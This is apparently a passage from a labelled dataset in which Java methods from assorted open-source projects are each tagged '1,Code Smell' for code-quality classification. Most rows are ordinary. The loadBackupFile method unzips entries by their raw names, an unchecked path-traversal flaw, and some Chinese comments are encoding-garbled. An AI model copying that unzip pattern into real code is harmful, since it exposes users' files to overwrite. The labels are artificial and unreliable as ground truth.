      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(3,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_LETTER_CHAR + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(4,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_UPPER_LETTER_CHAR + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
}",1,Code Smell
"private List<DtoFieldInfo> parseParamFieldsFromSql(String sql){
  List<ConditionExpr> conditionExprs=dynamicParamSqlEnhancer.parseSqlDynamicConditions(sql);
  if (conditionExprs.isEmpty()) {
    return Lists.newArrayList();
  }
  List<DtoFieldInfo> fields=Lists.newArrayList();
  for (  ConditionExpr expr : conditionExprs) {
    for (    String paramName : expr.getParamNames()) {
      DtoFieldInfo field=new DtoFieldInfo();
      field.setPropertyName(PathUtil.getShortNameFromFullRef(paramName));
      boolean isDate=paramName.toLowerCase().endsWith(""date"") || paramName.toLowerCase().endsWith(""time"");
      if (expr.getOperator().toUpperCase().equals(""IN"")) {
        DbColumnType cType=DbColumnType.STRING;
        if (isDate) {
          cType=getRightDateType(generatorConfig.getDateType());
          field.addImportJavaType(cType.getPkg());
        }
        field.setShortJavaType(""List<"" + cType.getType() + "">"");
        field.addImportJavaType(""java.util.List"");
      }
 else       if (rangeOperators.contains(expr.getOperator().toUpperCase())) {
        DbColumnType cType=DbColumnType.LONG;
        if (isDate) {
          cType=getRightDateType(generatorConfig.getDateType());
          field.addImportJavaType(cType.getPkg());
        }
        field.setShortJavaType(cType.getType());
      }
 else {
        field.setShortJavaType(""String"");
      }
      fields.add(field);
    }
  }
  return fields;
}
",1,Code Smell
"protected void processElement(SourceRecord element,SourceOutput<T> output,SourceSplitState splitState) throws Exception {
  if (isWatermarkEvent(element)) {
    Offset watermark=getWatermark(element);
    if (isHighWatermarkEvent(element) && splitState.isSnapshotSplitState()) {
      splitState.asSnapshotSplitState().setHighWatermark(watermark);
    }
  }
 else   if (isSchemaChangeEvent(element) && splitState.isStreamSplitState()) {
    HistoryRecord historyRecord=getHistoryRecord(element);
    Array tableChanges=historyRecord.document().getArray(HistoryRecord.Fields.TABLE_CHANGES);
    TableChanges changes=TABLE_CHANGE_SERIALIZER.deserialize(tableChanges,true);
    for (    TableChanges.TableChange tableChange : changes) {
      splitState.asStreamSplitState().recordSchema(tableChange.getId(),tableChange);
    }
    if (includeSchemaChanges) {
      emitElement(element,output);
    }
  }
 else   if (isDataChangeRecord(element)) {
    LOG.trace(""Process DataChangeRecord: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
    reportMetrics(element);
    emitElement(element,output);
  }
 else   if (isHeartbeatEvent(element)) {
    LOG.trace(""Process Heartbeat: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
  }
 else {
    LOG.info(""Meet unknown element {} for splitState = {}, just skip."",element,splitState);
  }
}
",1,Code Smell
"@Override public void onConnectionStateChanged(int newState,boolean inTransition){
  AndroidUtilities.runOnUIThread(() -> {
    if (newState == STATE_ESTABLISHED) {
      if (callStartTime == 0) {
        callStartTime=SystemClock.elapsedRealtime();
      }
    }
    if (newState == STATE_FAILED) {
      callFailed();
      return;
    }
    if (newState == STATE_ESTABLISHED) {
      if (connectingSoundRunnable != null) {
        AndroidUtilities.cancelRunOnUIThread(connectingSoundRunnable);
        connectingSoundRunnable=null;
      }
      Utilities.globalQueue.postRunnable(() -> {
        if (spPlayId != 0) {
          soundPool.stop(spPlayId);
          spPlayId=0;
        }
      }
);
      if (groupCall == null && !wasEstablished) {
        wasEstablished=true;
        if (!isProximityNear && !privateCall.video) {
          try {
            LaunchActivity.getLastFragment().getFragmentView().performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
          }
 catch (          Exception ignore) {
          }
        }
        AndroidUtilities.runOnUIThread(new Runnable(){
          @Override public void run(){
            if (tgVoip[CAPTURE_DEVICE_CAMERA] != null) {
              StatsController.getInstance(currentAccount).incrementTotalCallsTime(getStatsNetworkType(),5);
              AndroidUtilities.runOnUIThread(this,5000);
            }
          }
        }
,5000);
        if (isOutgoing) {
          StatsController.getInstance(currentAccount).incrementSentItemsCount(getStatsNetworkType(),StatsController.TYPE_CALLS,1);
        }
 else {
          StatsController.getInstance(currentAccount).incrementReceivedItemsCount(getStatsNetworkType(),StatsController.TYPE_CALLS,1);
        }
      }
    }
    if (newState == STATE_RECONNECTING && !isCallEnded) {
      Utilities.globalQueue.postRunnable(() -> {
        if (spPlayId != 0) {
          soundPool.stop(spPlayId);
        }
        spPlayId=soundPool.play(groupCall != null ? spVoiceChatConnecting : spConnectingId,1,1,0,-1,1);
      }
);
    }
    dispatchStateChanged(newState);
  }
);
}",1,Code Smell
"@Override protected ValueRef getValueRef(ExpressionState state) throws EvaluationException {
  TypedValue op=state.getActiveContextObject();
  Object operand=op.getValue();
  boolean operandIsArray=ObjectUtils.isArray(operand);
  if (operand instanceof Map) {
    Map<?,?> mapData=(Map<?,?>)operand;
    List<Object> result=new ArrayList<Object>();
    for (    Map.Entry<?,?> entry : mapData.entrySet()) {
      try {
        state.pushActiveContextObject(new TypedValue(entry));
        state.enterScope();
        result.add(this.children[0].getValueInternal(state).getValue());
      }
  finally {
        state.popActiveContextObject();
        state.exitScope();
      }
    }
    return new ValueRef.TypedValueHolderValueRef(new TypedValue(result),this);
  }
  if (operand instanceof Iterable || operandIsArray) {
    Iterable<?> data=(operand instanceof Iterable ? (Iterable<?>)operand : Arrays.asList(ObjectUtils.toObjectArray(operand)));
    List<Object> result=new ArrayList<Object>();
    int idx=0;
    Class<?> arrayElementType=null;
    for (    Object element : data) {
      try {
        state.pushActiveContextObject(new TypedValue(element));
        state.enterScope(""index"",idx);
        Object value=this.children[0].getValueInternal(state).getValue();
        if (value != null && operandIsArray) {
          arrayElementType=determineCommonType(arrayElementType,value.getClass());
        }
        result.add(value);
      }
  finally {
        state.exitScope();
        state.popActiveContextObject();
      }
      idx++;
    }
    if (operandIsArray) {
      if (arrayElementType == null) {
        arrayElementType=Object.class;
      }
      Object resultArray=Array.newInstance(arrayElementType,result.size());
      System.arraycopy(result.toArray(),0,resultArray,0,result.size());
      return new ValueRef.TypedValueHolderValueRef(new TypedValue(resultArray),this);
    }
    return new ValueRef.TypedValueHolderValueRef(new TypedValue(result),this);
  }
  if (operand == null) {
    if (this.nullSafe) {
      return ValueRef.NullValueRef.INSTANCE;
    }
    throw new SpelEvaluationException(getStartPosition(),SpelMessage.PROJECTION_NOT_SUPPORTED_ON_TYPE,""null"");
  }
  throw new SpelEvaluationException(getStartPosition(),SpelMessage.PROJECTION_NOT_SUPPORTED_ON_TYPE,operand.getClass().getName());
}",1,Code Smell
"/** 
 * Decodes bytes from  {@code in} into {@code out} until a delimiter 0x00 is encountered. Returns anew string containing the decoded characters.
 */
public static String decode(ByteInput in,char[] out) throws UTFDataFormatException {
  int s=0;
  while (true) {
    char a=(char)(in.readByte() & 0xff);
    if (a == 0) {
      return new String(out,0,s);
    }
    out[s]=a;
    if (a < '\u0080') {
      s++;
    }
 else     if ((a & 0xe0) == 0xc0) {
      int b=in.readByte() & 0xff;
      if ((b & 0xC0) != 0x80) {
        throw new UTFDataFormatException(""bad second byte"");
      }
      out[s++]=(char)(((a & 0x1F) << 6) | (b & 0x3F));
    }
 else     if ((a & 0xf0) == 0xe0) {
      int b=in.readByte() & 0xff;
      int c=in.readByte() & 0xff;
      if (((b & 0xC0) != 0x80) || ((c & 0xC0) != 0x80)) {
        throw new UTFDataFormatException(""bad second or third byte"");
      }
      out[s++]=(char)(((a & 0x0F) << 12) | ((b & 0x3F) << 6) | (c & 0x3F));
    }
 else {
      throw new UTFDataFormatException(""bad byte"");
    }
  }
}",1,Code Smell
"public Bulletin createChatsBulletin(List<TLObject> objects,CharSequence text,CharSequence subtitle){
  final Bulletin.UsersLayout layout=new Bulletin.UsersLayout(getContext(),subtitle != null,resourcesProvider);
  int count=0;
  if (objects != null) {
    for (int i=0; i < objects.size(); ++i) {
      if (count >= 3)       break;
      TLObject object=objects.get(i);
      if (object != null) {
        layout.avatarsImageView.setCount(++count);
        layout.avatarsImageView.setObject(count - 1,UserConfig.selectedAccount,object);
      }
    }
    if (objects.size() == 1) {
      layout.avatarsImageView.setTranslationX(AndroidUtilities.dp(4));
      layout.avatarsImageView.setScaleX(1.2f);
      layout.avatarsImageView.setScaleY(1.2f);
    }
 else {
      layout.avatarsImageView.setScaleX(1f);
      layout.avatarsImageView.setScaleY(1f);
    }
  }
  layout.avatarsImageView.commitTransition(false);
  if (subtitle != null) {
    layout.textView.setSingleLine(true);
    layout.textView.setMaxLines(1);
    layout.textView.setText(text);
    layout.subtitleView.setText(subtitle);
    layout.subtitleView.setSingleLine(true);
    layout.subtitleView.setMaxLines(1);
    if (layout.linearLayout.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 6 - (3 - count) * 12);
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.linearLayout.getLayoutParams()).leftMargin=margin;
      }
    }
  }
 else {
    layout.textView.setSingleLine(false);
    layout.textView.setMaxLines(2);
    layout.textView.setText(text);
    if (layout.textView.getLayoutParams() instanceof ViewGroup.MarginLayoutParams) {
      int margin=AndroidUtilities.dp(12 + 56 + 6 - (3 - count) * 12);
      if (LocaleController.isRTL) {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).rightMargin=margin;
      }
 else {
        ((ViewGroup.MarginLayoutParams)layout.textView.getLayoutParams()).leftMargin=margin;
      }
    }
  }
  if (LocaleController.isRTL) {
    layout.avatarsImageView.setTranslationX(AndroidUtilities.dp(32 - (count - 1) * 12));
  }
  return create(layout,Bulletin.DURATION_PROLONG);
}",1,Code Smell
"private void replacePlaceHolderViewToTargetScene(){
  List<ScenePlaceHolderView> holderViewList=new ArrayList<>();
  extractScenePlaceHolder(holderViewList,(ViewGroup)requireView());
  if (holderViewList.size() == 0) {
    return;
  }
  if (isSupportRestore()) {
    throw new IllegalStateException(""ScenePlaceHolderView can only be used when support restore is disabled"");
  }
  SparseArray<ViewGroup> parentIdViewMap=new SparseArray<>();
  for (int i=0, N=holderViewList.size(); i < N; i++) {
    ScenePlaceHolderView holderView=holderViewList.get(i);
    ViewGroup parent=(ViewGroup)holderView.getParent();
    int parentId=parent.getId();
    if (parentId == View.NO_ID) {
      throw new IllegalArgumentException(""ScenePlaceHolderView parent id can't be View.NO_ID"");
    }
    if (parentIdViewMap.get(parentId) == null) {
      parentIdViewMap.put(parentId,parent);
    }
 else     if (parentIdViewMap.get(parentId) != parent) {
      throw new IllegalArgumentException(""ScenePlaceHolderView' parent ViewGroup should have unique id,"" + "" the duplicate id is "" + Utility.getIdName(requireSceneContext(),parentId));
    }
    ViewGroup.LayoutParams layoutParams=holderView.getLayoutParams();
    String name=holderView.getSceneName();
    String tag=holderView.getSceneTag();
    Bundle arguments=holderView.getArguments();
    Scene scene=null;
    SceneComponentFactory componentFactory=holderView.getSceneComponentFactory();
    if (componentFactory != null) {
      scene=componentFactory.instantiateScene(requireSceneContext().getClassLoader(),name,arguments);
    }
    if (scene == null) {
      scene=SceneInstanceUtility.getInstanceFromClassName(requireSceneContext(),name,arguments);
    }
    int index=parent.indexOfChild(holderView);
    parent.removeView(holderView);
    if (holderView.getVisibility() == View.VISIBLE) {
      add(parentId,scene,tag);
    }
 else     if (holderView.getVisibility() == View.GONE) {
      beginTransaction();
      add(parentId,scene,tag);
      hide(scene);
      commitTransaction();
    }
 else {
      throw new IllegalStateException(""ScenePlaceHolderView's visibility can't be View.INVISIBLE, use View.VISIBLE or View.GONE instead"");
    }
    View sceneView=scene.requireView();
    if (holderView.getId() != View.NO_ID) {
      if (sceneView.getId() == View.NO_ID) {
        sceneView.setId(holderView.getId());
      }
 else       if (holderView.getId() != sceneView.getId()) {
        String holderViewIdName=Utility.getIdName(requireSceneContext(),holderView.getId());
        String sceneViewIdName=Utility.getIdName(requireSceneContext(),sceneView.getId());
        throw new IllegalStateException(String.format(""ScenePlaceHolderView's id %s is different from Scene root view's id %s"",holderViewIdName,sceneViewIdName));
      }
    }
    parent.removeView(sceneView);
    parent.addView(sceneView,index,layoutParams);
  }
}",1,Code Smell
"private void setFloatingProgressVisible(boolean visible,boolean animate){
  if (floatingButton == null || floatingProgressView == null) {
    return;
  }
  if (animate) {
    if (visible == floatingProgressVisible) {
      return;
    }
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    floatingProgressAnimator=new AnimatorSet();
    floatingProgressAnimator.playTogether(ObjectAnimator.ofFloat(floatingButton,View.ALPHA,visible ? 0f : 1f),ObjectAnimator.ofFloat(floatingButton,View.SCALE_X,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floatingButton,View.SCALE_Y,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floatingProgressView,View.ALPHA,visible ? 1f : 0f),ObjectAnimator.ofFloat(floatingProgressView,View.SCALE_X,visible ? 1f : 0.1f),ObjectAnimator.ofFloat(floatingProgressView,View.SCALE_Y,visible ? 1f : 0.1f));
    floatingProgressAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationStart(      Animator animation){
        floatingProgressView.setVisibility(View.VISIBLE);
        floatingButton.setVisibility(View.VISIBLE);
      }
      @Override public void onAnimationEnd(      Animator animation){
        if (animation == floatingProgressAnimator) {
          if (visible) {
            if (floatingButton != null) {
              floatingButton.setVisibility(View.GONE);
            }
          }
 else {
            if (floatingButton != null) {
              floatingProgressView.setVisibility(View.GONE);
            }
          }
          floatingProgressAnimator=null;
        }
      }
    }
);
    floatingProgressAnimator.setDuration(150);
    floatingProgressAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
    floatingProgressAnimator.start();
  }
 else {
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    if (visible) {
      floatingButton.setAlpha(0f);
      floatingButton.setScaleX(0.1f);
      floatingButton.setScaleY(0.1f);
      floatingButton.setVisibility(View.GONE);
      floatingProgressView.setAlpha(1f);
      floatingProgressView.setScaleX(1f);
      floatingProgressView.setScaleY(1f);
      floatingProgressView.setVisibility(View.VISIBLE);
    }
 else {
      floatingButton.setAlpha(1f);
      floatingButton.setScaleX(1f);
      floatingButton.setScaleY(1f);
      floatingButton.setVisibility(View.VISIBLE);
      floatingProgressView.setAlpha(0f);
      floatingProgressView.setScaleX(0.1f);
      floatingProgressView.setScaleY(0.1f);
      floatingProgressView.setVisibility(View.GONE);
    }
  }
}",1,Code Smell
"@Override protected String toEL(Integer depth,StringBuilder paramContext){
  checkMaxWaitSeconds();
  Integer sonDepth=depth == null ? null : depth + 1;
  StringBuilder sb=new StringBuilder();
  processWrapperTabs(sb,depth);
  sb.append(""PAR("");
  processWrapperNewLine(sb,depth);
  for (int i=0; i < this.getElWrapperList().size(); i++) {
    if (i > 0) {
      sb.append("","");
      processWrapperNewLine(sb,depth);
    }
    sb.append(this.getElWrapperList().get(i).toEL(sonDepth,paramContext));
  }
  processWrapperNewLine(sb,depth);
  processWrapperTabs(sb,depth);
  sb.append("")"");
  if (this.any) {
    sb.append("".any(true)"");
  }
  if (this.ignoreError) {
    sb.append("".ignoreError(true)"");
  }
  if (StrUtil.isNotBlank(customThreadExecutor)) {
    sb.append(StrUtil.format("".threadPool(\""{}\"")"",customThreadExecutor));
  }
  if (CollectionUtil.isNotEmpty(mustExecuteList)) {
    if (this.any) {
      throw new IllegalArgumentException(""'.must()' and '.any()' can use in when component at the same time!"");
    }
    sb.append("".must("");
    for (int i=0; i < mustExecuteList.size(); i++) {
      if (i > 0) {
        sb.append("", "");
      }
      sb.append(StrUtil.format(""\""{}\"""",mustExecuteList.get(i)));
    }
    sb.append("")"");
  }
  processWrapperProperty(sb,paramContext);
  return sb.toString();
}",1,Code Smell
"/** 
 * Parse history offset record info
 * @param jsonData  string offset information
 * @param result    process result
 */
public static boolean parseRecordInfo(String jsonData,ProcessResult result){
  JsonObject jsonObject=null;
  try {
    jsonObject=JsonParser.parseString(jsonData).getAsJsonObject();
  }
 catch (  Throwable e1) {
    result.setFailResult(String.format(""Parse history offset value failure, reason is %s"",e1.getMessage()));
    return result.isSuccess();
  }
  if (jsonObject == null) {
    result.setFailResult(""Parse error, history offset value must be valid json format!"");
    return result.isSuccess();
  }
  if (!jsonObject.has(""ver"")) {
    result.setFailResult(""FIELD ver is required in history offset value!"");
    return result.isSuccess();
  }
  int verValue=jsonObject.get(""ver"").getAsInt();
  if (verValue < TServerConstants.OFFSET_HISTORY_RECORD_SHORT_VERSION) {
    result.setFailResult(""Only support v2 or next version in history offset value!"");
    return result.isSuccess();
  }
  if (!jsonObject.has(""records"")) {
    result.setFailResult(""FIELD records is required in history offset value!"");
    return result.isSuccess();
  }
  List<Tuple3<String,Integer,Long>> resetOffsets=new ArrayList<>();
  JsonArray records=jsonObject.get(""records"").getAsJsonArray();
  for (int i=0; i < records.size(); i++) {
    JsonObject itemInfo=records.get(i).getAsJsonObject();
    if (itemInfo == null) {
      continue;
    }
    String topicName=itemInfo.get(""topic"").getAsString();
    JsonArray offsets=itemInfo.get(""offsets"").getAsJsonArray();
    for (int j=0; j < offsets.size(); j++) {
      JsonObject storeInfo=offsets.get(j).getAsJsonObject();
      if (storeInfo == null) {
        continue;
      }
      JsonArray partInfos=storeInfo.get(""parts"").getAsJsonArray();
      for (int k=0; k < partInfos.size(); k++) {
        JsonObject partItem=partInfos.get(k).getAsJsonObject();
        int partId=partItem.get(""partId"").getAsInt();
        long offsetVal=partItem.get(""iCfm"").getAsLong();
        resetOffsets.add(new Tuple3<>(topicName,partId,offsetVal));
      }
    }
  }
  result.setSuccResult(resetOffsets);
  return true;
}",1,Code Smell
"@Override public void getFrame(MissionInit missionInit,ByteBuffer buffer){
  if (!this.videoParams.isWantDepth()) {
    getRGBFrame(buffer);
    return;
  }
  final int width=this.videoParams.getWidth();
  final int height=this.videoParams.getHeight();
  GL30.glBindFramebuffer(GL30.GL_READ_FRAMEBUFFER,Minecraft.getMinecraft().getFramebuffer().framebufferObject);
  GL30.glBindFramebuffer(GL30.GL_DRAW_FRAMEBUFFER,this.fbo.framebufferObject);
  GL30.glBlitFramebuffer(0,0,Minecraft.getMinecraft().getFramebuffer().framebufferWidth,Minecraft.getMinecraft().getFramebuffer().framebufferHeight,0,0,width,height,GL11.GL_COLOR_BUFFER_BIT | GL11.GL_DEPTH_BUFFER_BIT,GL11.GL_NEAREST);
  this.fbo.bindFramebuffer(true);
  glReadPixels(0,0,width,height,GL_RGBA,GL_UNSIGNED_BYTE,buffer);
  glReadPixels(0,0,width,height,GL_DEPTH_COMPONENT,GL_FLOAT,this.depthBuffer);
  this.fbo.unbindFramebuffer();
  float minval, maxval;
  if (this.videoParams.getDepthScaling() == null || this.videoParams.getDepthScaling().isAutoscale()) {
    minval=1;
    maxval=0;
    for (int i=0; i < width * height; i++) {
      float f=this.depthBuffer.get(i);
      if (f < minval)       minval=f;
      if (f > maxval)       maxval=f;
    }
  }
 else {
    minval=this.videoParams.getDepthScaling().getMin().floatValue();
    maxval=this.videoParams.getDepthScaling().getMax().floatValue();
    if (minval > maxval) {
      float t=minval;
      minval=maxval;
      maxval=t;
    }
  }
  float range=maxval - minval;
  if (range < 0.000001)   range=0.000001f;
  float scale=255 / range;
  for (int i=0; i < width * height; i++) {
    float f=this.depthBuffer.get(i);
    f=(f < minval ? minval : (f > maxval ? maxval : f));
    f-=minval;
    f*=scale;
    buffer.put(i * 4 + 3,(byte)f);
  }
  this.depthBuffer.clear();
}",1,Code Smell
"/** 
 * Creates a map of the classes fields.
 */
protected HashMap<String,FieldDeserializer> getFieldMap(Class<?> cl){
  HashMap<String,FieldDeserializer> fieldMap=new HashMap<String,FieldDeserializer>();
  for (; cl != null; cl=cl.getSuperclass()) {
    Field[] fields=cl.getDeclaredFields();
    for (int i=0; i < fields.length; i++) {
      Field field=fields[i];
      if (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers()))       continue;
 else       if (fieldMap.get(field.getName()) != null)       continue;
      try {
        field.setAccessible(true);
      }
 catch (      Throwable e) {
        e.printStackTrace();
      }
      Class<?> type=field.getType();
      FieldDeserializer deser;
      if (String.class.equals(type)) {
        deser=new StringFieldDeserializer(field);
      }
 else       if (byte.class.equals(type)) {
        deser=new ByteFieldDeserializer(field);
      }
 else       if (char.class.equals(type)) {
        deser=new CharFieldDeserializer(field);
      }
 else       if (short.class.equals(type)) {
        deser=new ShortFieldDeserializer(field);
      }
 else       if (int.class.equals(type)) {
        deser=new IntFieldDeserializer(field);
      }
 else       if (long.class.equals(type)) {
        deser=new LongFieldDeserializer(field);
      }
 else       if (float.class.equals(type)) {
        deser=new FloatFieldDeserializer(field);
      }
 else       if (double.class.equals(type)) {
        deser=new DoubleFieldDeserializer(field);
      }
 else       if (boolean.class.equals(type)) {
        deser=new BooleanFieldDeserializer(field);
      }
 else       if (java.sql.Date.class.equals(type)) {
        deser=new SqlDateFieldDeserializer(field);
      }
 else       if (java.sql.Timestamp.class.equals(type)) {
        deser=new SqlTimestampFieldDeserializer(field);
      }
 else       if (java.sql.Time.class.equals(type)) {
        deser=new SqlTimeFieldDeserializer(field);
      }
 else {
        deser=new ObjectFieldDeserializer(field);
      }
      fieldMap.put(field.getName(),deser);
    }
  }
  return fieldMap;
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.nearest.protos.KNNModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.nearest.protos.KNNModelProto other=(org.tribuo.common.nearest.protos.KNNModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getVectorsList().equals(other.getVectorsList()))   return false;
  if (!getOutputsList().equals(other.getOutputsList()))   return false;
  if (getK() != other.getK())   return false;
  if (hasDistance() != other.hasDistance())   return false;
  if (hasDistance()) {
    if (!getDistance().equals(other.getDistance()))     return false;
  }
  if (getNumThreads() != other.getNumThreads())   return false;
  if (!getParallelBackend().equals(other.getParallelBackend()))   return false;
  if (hasCombiner() != other.hasCombiner())   return false;
  if (hasCombiner()) {
    if (!getCombiner().equals(other.getCombiner()))     return false;
  }
  if (hasNeighboursQueryFactory() != other.hasNeighboursQueryFactory())   return false;
  if (hasNeighboursQueryFactory()) {
    if (!getNeighboursQueryFactory().equals(other.getNeighboursQueryFactory()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"public void trade(List<ExchangeOrder> orders) throws ParseException {
  if (tradingHalt) {
    return;
  }
  for (  ExchangeOrder order : orders) {
    trade(order);
  }
}
/** 
 * 涓诲姩浜ゆ槗杈撳叆鐨勮鍗曪紝浜ゆ槗涓嶅畬鎴愮殑浼氳緭鍏ュ埌闃熷垪
 * @param exchangeOrder
 * @throws ParseException 
 */
public void trade(ExchangeOrder exchangeOrder) throws ParseException {
  if (tradingHalt) {
    return;
  }
  if (!symbol.equalsIgnoreCase(exchangeOrder.getSymbol())) {
    logger.info(""unsupported symbol,coin={},base={}"",exchangeOrder.getCoinSymbol(),exchangeOrder.getBaseSymbol());
    return;
  }
  if (exchangeOrder.getAmount().compareTo(BigDecimal.ZERO) <= 0 || exchangeOrder.getAmount().subtract(exchangeOrder.getTradedAmount()).compareTo(BigDecimal.ZERO) <= 0) {
    return;
  }
  TreeMap<BigDecimal,MergeOrder> limitPriceOrderList;
  LinkedList<ExchangeOrder> marketPriceOrderList;
  if (exchangeOrder.getDirection() == ExchangeOrderDirection.BUY) {
    limitPriceOrderList=sellLimitPriceQueue;
    marketPriceOrderList=sellMarketQueue;
  }
 else {
    limitPriceOrderList=buyLimitPriceQueue;
    marketPriceOrderList=buyMarketQueue;
  }
  if (exchangeOrder.getType() == ExchangeOrderType.MARKET_PRICE) {
    matchMarketPriceWithLPList(limitPriceOrderList,exchangeOrder);
  }
 else   if (exchangeOrder.getType() == ExchangeOrderType.LIMIT_PRICE) {
    if (exchangeOrder.getPrice().compareTo(BigDecimal.ZERO) <= 0) {
      return;
    }
    if (publishType == ExchangeCoinPublishType.FENTAN && exchangeOrder.getDirection() == ExchangeOrderDirection.SELL) {
      logger.info("">>>>>鍒嗘憡鍗栧崟>>>寮濮嬪鐞"");
      if (exchangeOrder.getTime().longValue() < dateTimeFormat.parse(clearTime).getTime()) {
        logger.info("">>>>>鍒嗘憡鍗栧崟>>>澶勫湪缁撴潫鏃堕棿涓庢竻鐩樻椂闂村唴"");
        matchLimitPriceWithLPListByFENTAN(limitPriceOrderList,exchangeOrder,false);
        return;
      }
    }
    matchLimitPriceWithLPList(limitPriceOrderList,exchangeOrder,false);
    if (exchangeOrder.getAmount().compareTo(exchangeOrder.getTradedAmount()) > 0) {
      matchLimitPriceWithMPList(marketPriceOrderList,exchangeOrder);
    }
  }
}",1,Code Smell
"public void loadBackupFile(@NonNull File backupFile) throws IOException {
  checkState();
  File[] workingDirFiles=workingDir.listFiles();
  if (workingDirFiles != null) {
    for (    File workingDirFile : workingDirFiles) {
      if (!LOCK_FILE_NAME.equals(workingDirFile.getName()) && workingDir.isFile()) {
        workingDirFile.delete();
      }
    }
  }
  byte[] buffer=new byte[4096];
  try (ZipFile zipFile=new ZipFile(backupFile)){
    Enumeration<? extends ZipEntry> entries=zipFile.entries();
    while (entries.hasMoreElements()) {
      ZipEntry entry=entries.nextElement();
      String name=entry.getName();
      if (!entry.isDirectory()) {
        File file=new File(workingDir,name);
        file.createNewFile();
        InputStream inputStream=zipFile.getInputStream(entry);
        try (FileOutputStream fileOutputStream=new FileOutputStream(file)){
          int s;
          while ((s=inputStream.read(buffer)) > 0) {
            fileOutputStream.write(buffer,0,s);
          }
          inputStream.close();
        }
       }
    }
  }
   File metadataFile=new File(workingDir,METADATA_FILE_NAME);
  if (!metadataFile.exists()) {
    throw new IllegalStateException(""Invalid backup file: "" + backupFile.getAbsolutePath() + ""\n""+ ""The backup file is not a valid backup file."");
  }
  ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
  try (FileInputStream fileInputStream=new FileInputStream(metadataFile)){
    int s;
    while ((s=fileInputStream.read(buffer)) > 0) {
      byteArrayOutputStream.write(buffer,0,s);
    }
    mBackupMetadata=byteArrayOutputStream.toString();
  }
 }",1,Code Smell
"@Override protected void service(HttpServletRequest req,HttpServletResponse resp) throws IOException {
  TenantIdentifier tenantIdentifier=null;
  try {
    tenantIdentifier=getTenantIdentifierWithoutVerifying(req);
    if (!this.checkIPAccess(req,resp)) {
      return;
    }
    if (this.checkAPIKey(req)) {
      assertThatAPIKeyCheckPasses(req);
    }
    SemVer version=getVersionFromRequest(req);
    if (version.lesserThan(SemVer.v3_0) && !tenantIdentifier.getTenantId().equals(TenantIdentifier.DEFAULT_TENANT_ID)) {
      sendTextResponse(404,""Not found"",resp);
      return;
    }
    if (this.versionNeeded(req)) {
      assertThatVersionIsCompatible(version);
      Logging.info(main,tenantIdentifier,""API called: "" + req.getRequestURI() + "". Method: ""+ req.getMethod()+ "". Version: ""+ version,false);
    }
 else {
      Logging.info(main,tenantIdentifier,""API called: "" + req.getRequestURI() + "". Method: ""+ req.getMethod(),false);
    }
    super.service(req,resp);
  }
 catch (  Exception e) {
    Logging.error(main,tenantIdentifier,""API threw an exception: "" + req.getMethod() + "" ""+ req.getRequestURI(),Main.isTesting,e);
    if (e instanceof QuitProgramException) {
      main.wakeUpMainThreadToShutdown();
    }
 else     if (e instanceof TenantOrAppNotFoundException) {
      sendTextResponse(400,""AppId or tenantId not found => "" + ((TenantOrAppNotFoundException)e).getMessage(),resp);
    }
 else     if (e instanceof FeatureNotEnabledException) {
      sendTextResponse(402,e.getMessage(),resp);
    }
 else     if (e instanceof BadPermissionException) {
      sendTextResponse(403,e.getMessage(),resp);
    }
 else     if (e instanceof ServletException) {
      ServletException se=(ServletException)e;
      Throwable rootCause=se.getRootCause();
      if (rootCause instanceof BadRequestException) {
        sendTextResponse(400,rootCause.getMessage(),resp);
      }
 else       if (rootCause instanceof FeatureNotEnabledException) {
        sendTextResponse(402,rootCause.getMessage(),resp);
      }
 else       if (rootCause instanceof APIKeyUnauthorisedException) {
        sendTextResponse(401,""Invalid API key"",resp);
      }
 else       if (rootCause instanceof TenantOrAppNotFoundException) {
        sendTextResponse(400,""AppId or tenantId not found => "" + ((TenantOrAppNotFoundException)rootCause).getMessage(),resp);
      }
 else       if (rootCause instanceof BadPermissionException) {
        sendTextResponse(403,rootCause.getMessage(),resp);
      }
 else {
        sendTextResponse(500,""Internal Error"",resp);
      }
    }
 else {
      sendTextResponse(500,""Internal Error"",resp);
    }
  }
  Logging.info(main,tenantIdentifier,""API ended: "" + req.getRequestURI() + "". Method: ""+ req.getMethod(),false);
  if (tenantIdentifier != null) {
    try {
      RequestStats.getInstance(main,tenantIdentifier.toAppIdentifier()).updateRequestStats();
    }
 catch (    TenantOrAppNotFoundException e) {
    }
  }
}",1,Code Smell
"/** 
 * 澶嶅埗鍏叡姝ラ
